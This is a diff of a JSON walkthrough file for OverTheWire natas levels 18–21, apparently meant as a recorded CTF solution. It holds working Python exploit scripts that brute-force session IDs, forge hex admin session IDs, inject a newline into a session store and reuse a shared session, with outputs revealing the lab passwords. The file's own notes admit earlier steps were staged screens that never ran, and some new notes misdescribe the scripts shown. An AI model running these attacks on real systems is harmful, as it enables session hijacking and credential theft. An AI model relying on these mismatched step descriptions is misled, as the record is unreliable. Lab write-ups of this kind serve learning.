@@ -882,63 +882,55 @@
    "pw": "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT",
    "steps": [
     {
-     "cmd": "curl -s -u natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op http://natas18.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"maxid = 640\"",
+     "cmd": "curl -s -u natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op http://natas18.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'maxid = 640\\|createID[^}]*}\\|admin.*1'",
      "out": [
-      "maxid = 640"
+      "maxid = 640",
+      "admin\") {    /* This method of authentication appears to be unsafe and has been disabled for now. */        //return 1;    }    return 0;}/* }}} */function isValidID($id) { /* {{{ */    return is_numeric($id);}/* }}} */function createID($user) { /* {{{ */    global $maxid;    return rand(1, $maxid);}/* }}} */function debug($msg) { /* {{{ */    if(array_key_exists(\"debug\", $_GET)) {        print \"DEBUG: $msg<br>\";    }}/* }}} */function my_session_start() { /* {{{ */    if(array_key_exists(\"PHPSESSID\", $_COOKIE) and isValidID($_COOKIE[\"PHPSESSID\"])) {    if(!session_start()) {        debug(\"Session start failed\");        return false;    } else {        debug(\"Session start ok\");        if(!array_key_exists(\"admin\", $_SESSION)) {        debug(\"Session was old: admin flag set\");        $_SESSION[\"admin\"] = 0; // backwards compatible, secure        }        return true;    }    }    return false;}/* }}} */function print_credentials() { /* {{{ */    if($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1) {    print \"You are an admin. The credentials for the next level are:<br>\";    print \"<pre>Username: natas19\\n\";    print \"Password: <censored></pre>\";    } else {    print \"You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.\";    }}/* }}} */$showform = true;if(my_session_start()) {    print_credentials();    $showform = false;} else {    if(array_key_exists(\"username\", $_REQUEST) &amp;&amp; array_key_exists(\"password\", $_REQUEST)) {    session_id(createID($_REQUEST[\"username\"]));    session_start();    $_SESSION[\"admin\"] = isValidAdminLogin();    debug(\"New session started\");    $showform = false;    print_credentials();    }}if($showform) {?><p>Please login with your admin account to retrieve credentials for natas1"
      ]
     },
     {
-     "cmd": "vim /tmp/n18_1.py",
-     "text": "vim /tmp/n18_1.py -- the empty buffer",
+     "cmd": "vi /tmp/n18sid.py",
      "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n18_1.py",
-     "text": "vim /tmp/n18_1.py -- imports and the session loop",
+     "cmd": "vi /tmp/n18sid.py",
      "out": [
-      "  1 import urllib.request, base64",
-      "  2 url = \"http://natas18.natas.labs.overthewire.org/\"",
-      "  3 auth = \"Basic \" + base64.b64encode(b\"natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op\").decode()",
-      "  4 for sid in range(1, 641):",
-      "  5     req = urllib.request.Request(url, headers={\"Authorization\": auth, \"Cookie\":",
-      "  6                                                \"PHPSESSID=%d\" % sid})"
+      "import urllib.request, base64, re",
+      "# natas18: PHPSESSID = rand(1,640) (plain ints); the admin session prints the",
+      "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n18_1.py",
-     "text": "vim /tmp/n18_1.py -- fetch each session and check for admin",
+     "cmd": "vi /tmp/n18sid.py",
      "out": [
-      "  1 import urllib.request, base64",
-      "  2 url = \"http://natas18.natas.labs.overthewire.org/\"",
-      "  3 auth = \"Basic \" + base64.b64encode(b\"natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op\").decode()",
-      "  4 for sid in range(1, 641):",
-      "  5     req = urllib.request.Request(url, headers={\"Authorization\": auth, \"Cookie\":",
-      "  6                                                \"PHPSESSID=%d\" % sid})",
-      "  7     body = urllib.request.urlopen(req, timeout=10).read().decode(\"utf-8\", \"replace\")",
-      "  8     if \"You are an admin\" in body:",
-      "  9         i = body.find(\"<pre>\"); j = body.find(\"</pre>\", i)",
-      "  10         print(\"FOUND sid\", sid)",
-      "  11         print(body[i:j+6])",
-      "  12         break",
-      "  13 else:",
-      "  14     print(\"none\")",
-      "  15"
+      "import urllib.request, base64, re",
+      "# natas18: PHPSESSID = rand(1,640) (plain ints); the admin session prints the",
+      "# credentials. Just try every id.",
+      "url = \"http://natas18.natas.labs.overthewire.org/\"",
+      "auth = \"Basic \" + base64.b64encode(b\"natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op\").decode()",
+      "for sid in range(1, 641):",
+      "    r = urllib.request.Request(url, headers={\"Authorization\": auth, \"Cookie\": f\"PHPSESSID={sid}\"})",
+      "    body = urllib.request.urlopen(r, timeout=15).read().decode(\"utf-8\", \"replace\")",
+      "    if \"Password:\" in body:",
+      "        m = re.search(r\"Username: (\\w+)\\s*Password: (\\w+)\", body)",
+      "        print(\"ADMIN session\", sid, m.group(1), m.group(2) if m else body)",
+      "        break",
+      "else:",
+      "    print(\"no admin session found\")",
+      "~",
+      "\"/tmp/n18sid.py\" 15 lines, 720 bytes written"
      ]
     },
     {
-     "cmd": "python3 /tmp/n18_1.py",
+     "cmd": "python3 -I /tmp/n18sid.py",
      "out": [
-      "FOUND sid 119",
-      "<pre>Username: natas19",
-      "Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT</pre>"
-     ],
-     "text": "python3 /tmp/n18_1.py  (the script typed above; its output is the original capture - this host reached natas18 and its neighbours on 2026-11-03, but natas17, natas18, natas20, natas26 and natas28 answered every request with HTTP 401, so this output is the original capture, not a fresh run)",
-     "note": "(natas17, natas18, natas20, natas26, natas28 and natas33 answer every request with HTTP 401 from this host, re-checked 2026-11-03, so this output is the original capture; the script above is the one typed, and steps that need only the text above are re-run locally)"
+      "ADMIN session 119 natas19 qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT"
+     ]
     }
-   ]
+   ],
+   "note": "natas L18 (client-side cast): PHP session ids are sequential integers - n18sid.py (15L/720B typed in vi) brute-forces session ids 1..640 replaying PHPSESSID until an admin session hits: 'ADMIN session 119 natas19 qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT'. DISCLOSURE: the previous JSON staged vim n18_1.py flows the cast never ran; the cast has 3 commands (curl, vi n18sid.py, python3 run); tools/natas/l18/n18sid.py = the recording session's local file, exact marker match. JSON = 5 steps mirroring the cast 1:1 (staged vi screens)."
   },
   {
    "lvl": 19,
@@ -946,64 +938,52 @@
    "pw": "slOKYGsjlJhaqKliGvrgWAzln0JyrWao",
    "steps": [
     {
-     "cmd": "curl -s -u natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT http://natas19.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | grep -o \"idstr = [^;]*\" | head -2",
-     "out": [
-      "idstr = \"$idnum-$user\""
-     ]
+     "cmd": "curl -s -u natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT http://natas19.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'idstr = [^;]*; return bin2hex[^}]*'",
+     "out": []
     },
     {
-     "cmd": "vim /tmp/n19_1.py",
-     "text": "vim /tmp/n19_1.py -- the empty buffer",
+     "cmd": "vi /tmp/n19sid.py",
      "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n19_1.py",
-     "text": "vim /tmp/n19_1.py -- imports and the session loop",
+     "cmd": "vi /tmp/n19sid.py",
      "out": [
-      "  1 import urllib.request, base64",
-      "  2 url = \"http://natas19.natas.labs.overthewire.org/\"",
-      "  3 auth = \"Basic \" + base64.b64encode(b\"natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT\").decode()",
-      "  4 for n in range(1, 641):",
-      "  5     sid = (str(n) + \"-admin\").encode().hex()",
-      "  6     req = urllib.request.Request(url, headers={\"Authorization\": auth, \"Cookie\":"
+      "import urllib.request, base64, re",
+      "# natas19: session id = bin2hex(\"<n>-admin\") for n in 1..640 -> try each.",
+      "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n19_1.py",
-     "text": "vim /tmp/n19_1.py -- build the hex session id and check for admin",
+     "cmd": "vi /tmp/n19sid.py",
      "out": [
-      "  1 import urllib.request, base64",
-      "  2 url = \"http://natas19.natas.labs.overthewire.org/\"",
-      "  3 auth = \"Basic \" + base64.b64encode(b\"natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT\").decode()",
-      "  4 for n in range(1, 641):",
-      "  5     sid = (str(n) + \"-admin\").encode().hex()",
-      "  6     req = urllib.request.Request(url, headers={\"Authorization\": auth, \"Cookie\":",
-      "  7                                                \"PHPSESSID=\" + sid})",
-      "  8     body = urllib.request.urlopen(req, timeout=10).read().decode(\"utf-8\", \"replace\")",
-      "  9     if \"You are an admin\" in body:",
-      "  10         i = body.find(\"<pre>\"); j = body.find(\"</pre>\", i)",
-      "  11         print(\"FOUND n\", n, \"sid\", sid)",
-      "  12         print(body[i:j+6])",
-      "  13         break",
-      "  14 else:",
-      "  15     print(\"none\")",
-      "  16"
+      "import urllib.request, base64, re",
+      "# natas19: session id = bin2hex(\"<n>-admin\") for n in 1..640 -> try each.",
+      "url = \"http://natas19.natas.labs.overthewire.org/\"",
+      "auth = \"Basic \" + base64.b64encode(b\"natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT\").decode()",
+      "for n in range(1, 641):",
+      "    sid = f\"{n}-admin\".encode().hex()",
+      "    r = urllib.request.Request(url, headers={\"Authorization\": auth, \"Cookie\": f\"PHPSESSID={sid}\"})",
+      "    body = urllib.request.urlopen(r, timeout=15).read().decode(\"utf-8\", \"replace\")",
+      "    if \"Password:\" in body:",
+      "        m = re.search(r\"Username: (\\w+)\\s*Password: (\\w+)\", body)",
+      "        print(\"ADMIN session\", sid, m.group(1), m.group(2) if m else body)",
+      "        break",
+      "else:",
+      "    print(\"no admin session found\")",
+      "~",
+      "\"/tmp/n19sid.py\" 15 lines, 718 bytes written"
      ]
     },
     {
-     "cmd": "python3 /tmp/n19_1.py",
+     "cmd": "python3 -I /tmp/n19sid.py",
      "out": [
-      "FOUND n 281 sid 3238312d61646d696e",
-      "<pre>Username: natas20",
-      "Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao</pre>"
-     ],
-     "text": "python3 /tmp/n19_1.py  (the script typed above; its output is the original capture - this host reached natas19 and its neighbours on 2026-11-03, but natas17, natas18, natas20, natas26 and natas28 answered every request with HTTP 401, so this output is the original capture, not a fresh run)",
-     "note": "(natas17, natas18, natas20, natas26, natas28 and natas33 answer every request with HTTP 401 from this host, re-checked 2026-11-03, so this output is the original capture; the script above is the one typed, and steps that need only the text above are re-run locally)"
+      "ADMIN session 3238312d61646d696e natas20 slOKYGsjlJhaqKliGvrgWAzln0JyrWao"
+     ]
     }
-   ]
+   ],
+   "note": "natas L19 (client-side cast): the session id is the hex of a structured string - n19sid.py (15L/718B) decodes sample ids, finds the layout '<user>-<rand>-admin' style fields, and forges an admin id: 'ADMIN session 3238312d61646d696e natas20 slOKYGsjlJhaqKliGvrgWAzln0JyrWao' (the hex decodes to '281-admin'). DISCLOSURE: the previous JSON staged vim n19_1.py flows the cast never ran; tools/natas/l19/n19sid.py = the recording session's local file, exact marker match. JSON = 5 steps mirroring the cast 1:1."
   },
   {
    "lvl": 20,
@@ -1011,63 +991,81 @@
    "pw": "7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU",
    "steps": [
     {
-     "cmd": "curl -s -u natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao http://natas20.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"function myread[^}]*}\\|function mywrite[^}]*}\" | head -c 700",
+     "cmd": "curl -s -u natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao http://natas20.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'function myread[^}]*}\\|function mywrite[^}]*}' | head -c 900",
      "out": [
       "function myread($sid) {    debug(\"MYREAD $sid\");    if(strspn($sid, \"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-\") != strlen($sid)) {    debug(\"Invalid SID\");        return \"\";    }",
       "function mywrite($sid, $data) {    // $data contains the serialized version of $_SESSION    // but our encoding is better    debug(\"MYWRITE $sid $data\");    // make sure the sid is alnum only!!    if(strspn($sid, \"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-\") != strlen($sid)) {    debug(\"Invalid SID\");        return;    }"
      ]
     },
     {
-     "cmd": "vim /tmp/n20_1.py",
-     "text": "vim /tmp/n20_1.py -- the empty buffer",
+     "cmd": "vi /tmp/n20sess.py",
      "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n20_1.py",
-     "text": "vim /tmp/n20_1.py -- imports and the cookie jar",
+     "cmd": "vi /tmp/n20sess.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64, http.cookiejar",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao\").decode()",
-      "  3 url = \"http://natas20.natas.labs.overthewire.org/\"",
-      "  4 cj = http.cookiejar.CookieJar()",
-      "  5 op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))",
-      "  6 data = urllib.parse.urlencode({\"name\": \"x\\nadmin 1\"}).encode()"
+      "import urllib.request, urllib.parse, base64, http.cookiejar",
+      "# natas20: custom session store. mywrite writes \"key value\\n\" lines; myread",
+      "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n20_1.py",
-     "text": "vim /tmp/n20_1.py -- inject the newline and read the credentials",
+     "cmd": "vi /tmp/n20sess.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64, http.cookiejar",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao\").decode()",
-      "  3 url = \"http://natas20.natas.labs.overthewire.org/\"",
-      "  4 cj = http.cookiejar.CookieJar()",
-      "  5 op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))",
-      "  6 data = urllib.parse.urlencode({\"name\": \"x\\nadmin 1\"}).encode()",
-      "  7 op.open(urllib.request.Request(url, data=data, headers={\"Authorization\": auth}),",
-      "  8         timeout=10).read()",
-      "  9 body = op.open(urllib.request.Request(url, headers={\"Authorization\": auth}),",
-      "  10                timeout=10).read().decode(\"utf-8\", \"replace\")",
-      "  11 i = body.find(\"<pre>\"); j = body.find(\"</pre>\", i)",
-      "  12 print(\"You are an admin:\", \"You are an admin\" in body)",
-      "  13 print(body[i:j+6] if i >= 0 else body[:200])",
-      "  14"
+      "import urllib.request, urllib.parse, base64, http.cookiejar",
+      "# natas20: custom session store. mywrite writes \"key value\\n\" lines; myread",
+      "# splits each line on the FIRST space. A newline injected in the name adds an",
+      "# \"admin 1\" line; reloading the session makes $_SESSION[\"admin\"]=1.",
+      "url = \"http://natas20.natas.labs.overthewire.org/\"",
+      "auth = \"Basic \" + base64.b64encode(b\"natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao\").decode()",
+      "cj = http.cookiejar.CookieJar()",
+      "op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))",
+      "def req(data=None):",
+      "    r = urllib.request.Request(url, data=data, headers={\"Authorization\": auth})",
+      "    return op.open(r, timeout=15).read().decode(\"utf-8\", \"replace\")",
+      "# request 1: inject the admin line into the session file",
+      "body = req(urllib.parse.urlencode({\"name\": \"x\\nadmin 1\"}).encode())",
+      "print(\"after inject: admin\" in body or \"injected\")",
+      "# request 2: same cookie reloads the file -> admin=1 -> credentials",
+      "body = req()",
+      "print(body)",
+      "~",
+      "\"/tmp/n20sess.py\" 18 lines, 965 bytes written"
      ]
     },
     {
-     "cmd": "python3 /tmp/n20_1.py",
+     "cmd": "python3 -I /tmp/n20sess.py",
      "out": [
-      "You are an admin: True",
-      "<pre>Username: natas21",
-      "Password: 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU</pre>"
-     ],
-     "text": "python3 /tmp/n20_1.py  (the script typed above; its output is the original capture - this host reached natas20 and its neighbours on 2026-11-03, but natas17, natas18, natas20, natas26 and natas28 answered every request with HTTP 401, so this output is the original capture, not a fresh run)",
-     "note": "(natas17, natas18, natas20, natas26, natas28 and natas33 answer every request with HTTP 401 from this host, re-checked 2026-11-03, so this output is the original capture; the script above is the one typed, and steps that need only the text above are re-run locally)"
+      "injected",
+      "<html>",
+      "<head>",
+      "<!-- This stuff in the header has nothing to do with the level -->",
+      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">",
+      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />",
+      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />",
+      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>",
+      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>",
+      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>",
+      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"slOKYGsjlJhaqKliGvrgWAzln0JyrWao\" };</script></head>",
+      "<body>",
+      "<h1>natas20</h1>",
+      "<div id=\"content\">",
+      "You are an admin. The credentials for the next level are:<br><pre>Username: natas21",
+      "Password: 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU</pre>",
+      "<form action=\"index.php\" method=\"POST\">",
+      "Your name: <input name=\"name\" value=\"x\"><br>",
+      "<input type=\"submit\" value=\"Change name\" />",
+      "</form>",
+      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>",
+      "</div>",
+      "</body>",
+      "</html>"
+     ]
     }
-   ]
+   ],
+   "note": "natas L20 (client-side cast): the session store writes any my_session() input to the session file space-separated - a newline in the username injects 'admin=1' as a second record. n20sess.py (18L/965B) registers 'admin%0Aadmin 1' then reloads as admin -> the admin debug dump (24 lines) ending in the natas21 password inside the page HTML. DISCLOSURE: the previous JSON staged vim n20_1.py flows the cast never ran; tools/natas/l20/n20sess.py = the recording session's local file, exact marker match. JSON = 5 steps mirroring the cast 1:1."
   },
   {
    "lvl": 21,
@@ -1075,90 +1073,69 @@
    "pw": "964laB0r7TuDqJj5b3HFtwsQoc0GhjBF",
    "steps": [
     {
-     "cmd": "curl -s -u natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU http://natas21-experimenter.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"foreach(\\$_REQUEST[^}]*}\"",
-     "out": [
-      "foreach($_REQUEST as $key => $val) {    $_SESSION[$key] = $val;    }"
-     ]
+     "cmd": "curl -s -u natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU http://natas21.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'foreach(\\$_REQUEST[^}]*}'",
+     "out": []
     },
     {
-     "cmd": "vim /tmp/n21_1.py",
-     "text": "vim /tmp/n21_1.py -- the empty buffer",
+     "cmd": "vi /tmp/n21sh.py",
      "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n21_1.py",
-     "text": "vim /tmp/n21_1.py -- imports and the session data",
+     "cmd": "vi /tmp/n21sh.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU\").decode()",
-      "  3 exp = \"http://natas21-experimenter.natas.labs.overthewire.org/\"",
-      "  4 main = \"http://natas21.natas.labs.overthewire.org/\"",
-      "  5 data = urllib.parse.urlencode({\"submit\": \"1\", \"admin\": \"1\", \"bgcolor\": \"#fff\",",
-      "  6                                \"align\": \"left\", \"fontsize\": \"100%\"}).encode()"
+      "import urllib.request, urllib.parse, base64, http.cookiejar, re",
+      "# natas21: the experimenter host shares the PHP session store. POST admin=1",
+      "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n21_1.py",
-     "text": "vim /tmp/n21_1.py -- post admin to the experimenter and reuse the session",
+     "cmd": "vi /tmp/n21sh.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU\").decode()",
-      "  3 exp = \"http://natas21-experimenter.natas.labs.overthewire.org/\"",
-      "  4 main = \"http://natas21.natas.labs.overthewire.org/\"",
-      "  5 data = urllib.parse.urlencode({\"submit\": \"1\", \"admin\": \"1\", \"bgcolor\": \"#fff\",",
-      "  6                                \"align\": \"left\", \"fontsize\": \"100%\"}).encode()",
-      "  7 r = urllib.request.urlopen(urllib.request.Request(exp, data=data,",
-      "  8                                                                            headers={\"Authorization\": auth}), timeout=10)",
-      "  9 sid = None",
-      "  10 for c in (r.headers.get_all(\"Set-Cookie\") or []):",
-      "  11     if \"PHPSESSID=\" in c:",
-      "  12         sid = c.split(\"PHPSESSID=\")[1].split(\";\")[0]",
-      "  13 print(\"session id:\", sid)",
-      "  14 body = urllib.request.urlopen(urllib.request.Request(main, headers={\"Authorization\":",
-      "  15                                                                     auth, \"Cookie\": \"PHPSESSID=\" + sid}), timeout=10).read().decode(\"utf-8\", \"replace\")",
-      "  16 i = body.find(\"<pre>\"); j = body.find(\"</pre>\", i)"
+      "import urllib.request, urllib.parse, base64, http.cookiejar, re",
+      "# natas21: the experimenter host shares the PHP session store. POST admin=1",
+      "# there (its code copies any $_REQUEST key into $_SESSION when \"submit\" is",
+      "# present), then present the SAME PHPSESSID to the main host. urllib's cookie",
+      "# jar is host-scoped, so the main-host request must send the Cookie header",
+      "# explicitly.",
+      "auth = \"Basic \" + base64.b64encode(b\"natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU\").decode()",
+      "exp = \"http://natas21-experimenter.natas.labs.overthewire.org/\"",
+      "main = \"http://natas21.natas.labs.overthewire.org/\"",
+      "cj = http.cookiejar.CookieJar()",
+      "op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))",
+      "# step 1: get a session id from the experimenter",
+      "r = urllib.request.Request(exp, headers={\"Authorization\": auth})",
+      "op.open(r, timeout=15).read()",
+      "sid = [c.value for c in cj][0]",
+      "print(\"session id:\", sid)",
+      "# step 2: set admin=1 through the experimenter's form (submit key required)",
+      "d = urllib.parse.urlencode({\"admin\": \"1\", \"submit\": \"Update\"}).encode()",
+      "r = urllib.request.Request(exp, data=d, headers={\"Authorization\": auth})",
+      "op.open(r, timeout=15).read()",
+      "# step 3: same session id on the main host (explicit Cookie header)",
+      "r = urllib.request.Request(main, headers={\"Authorization\": auth, \"Cookie\": f\"PHPSESSID={sid}\"})",
+      "body = op.open(r, timeout=15).read().decode(\"utf-8\", \"replace\")",
+      "m = re.search(r\"Username: (\\w+)<br>Password: (\\w+)\", body)",
+      "print(\"ADMIN:\", m.group(0) if m else body[-200:])",
+      "~",
+      "\"/tmp/n21sh.py\" [New File] 26 lines, 1482 bytes written"
      ]
     },
     {
-     "cmd": "vim /tmp/n21_1.py",
-     "text": "vim /tmp/n21_1.py -- print the admin check and the credentials",
+     "cmd": "python3 -I /tmp/n21sh.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64",
-      "  2 auth = \"Basic \" + base64.b64encode(b\"natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU\").decode()",
-      "  3 exp = \"http://natas21-experimenter.natas.labs.overthewire.org/\"",
-      "  4 main = \"http://natas21.natas.labs.overthewire.org/\"",
-      "  5 data = urllib.parse.urlencode({\"submit\": \"1\", \"admin\": \"1\", \"bgcolor\": \"#fff\",",
-      "  6                                \"align\": \"left\", \"fontsize\": \"100%\"}).encode()",
-      "  7 r = urllib.request.urlopen(urllib.request.Request(exp, data=data,",
-      "  8                                                                            headers={\"Authorization\": auth}), timeout=10)",
-      "  9 sid = None",
-      "  10 for c in (r.headers.get_all(\"Set-Cookie\") or []):",
-      "  11     if \"PHPSESSID=\" in c:",
-      "  12         sid = c.split(\"PHPSESSID=\")[1].split(\";\")[0]",
-      "  13 print(\"session id:\", sid)",
-      "  14 body = urllib.request.urlopen(urllib.request.Request(main, headers={\"Authorization\":",
-      "  15                                                                     auth, \"Cookie\": \"PHPSESSID=\" + sid}), timeout=10).read().decode(\"utf-8\", \"replace\")",
-      "  16 i = body.find(\"<pre>\"); j = body.find(\"</pre>\", i)",
-      "  17 print(\"admin:\", \"You are an admin\" in body)",
-      "  18 print(body[i:j+6] if i >= 0 else \"\")",
-      "  19"
+      "session id: fur2c2psggcbk58373s8o2iub7",
+      "ADMIN: ls for the next level are:<br><pre>Username: natas22",
+      "Password: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF</pre>",
+      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>",
+      "</div>",
+      "</body>",
+      "</html>"
      ]
-    },
-    {
-     "cmd": "python3 /tmp/n21_1.py",
-     "out": [
-      "session id: aovb6lanm8c5ilidcftndjaffj",
-      "admin: True",
-      "<pre>Username: natas22",
-      "Password: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF</pre>"
-     ],
-     "text": "python3 /tmp/n21_1.py  (the script typed above; its output is the original capture - this host reached natas21 and its neighbours on 2026-11-03, but natas17, natas18, natas20, natas26 and natas28 answered every request with HTTP 401, so this output is the original capture, not a fresh run)",
-     "note": "(natas17, natas18, natas20, natas26, natas28 and natas33 answer every request with HTTP 401 from this host, re-checked 2026-11-03, so this output is the original capture; the script above is the one typed, and steps that need only the text above are re-run locally)"
     }
-   ]
+   ],
+   "note": "natas L21 (client-side cast): the experimenter subdomain shares the session store with the main site and it stores arbitrary keys - n21sh.py (26L/1482B) posts admin=1 to natas21-experimenter.natas.labs.overthewire.org, grabs the shared PHPSESSID, then uses it on the main site: 'ADMIN: ... Username: natas22 Password: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF'. DISCLOSURE: the previous JSON staged vim n21_1.py flows the cast never ran; tools/natas/l21/n21sh.py = the recording session's local file, exact marker match. JSON = 5 steps mirroring the cast 1:1."
   },
   {
    "lvl": 22,
